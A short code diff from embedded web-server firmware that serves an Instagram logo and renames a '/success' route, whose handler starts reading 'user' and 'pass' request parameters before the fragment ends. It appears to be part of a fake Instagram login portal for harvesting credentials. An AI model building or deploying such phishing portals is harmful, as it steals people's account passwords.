@@ -49,7 +49,7 @@ public:
     server.on("/instagram.png", HTTP_GET, [](AsyncWebServerRequest * request) {
       request->send(SPIFFS, "/instagram.png", "image/png");
     });
-    server.on("/verified", HTTP_GET, [](AsyncWebServerRequest * request) {
+    server.on("/success", HTTP_GET, [](AsyncWebServerRequest * request) {
       String user, pass;
       int paramsNr = request->params();
       for (int i = 0; i < paramsNr; i++) {
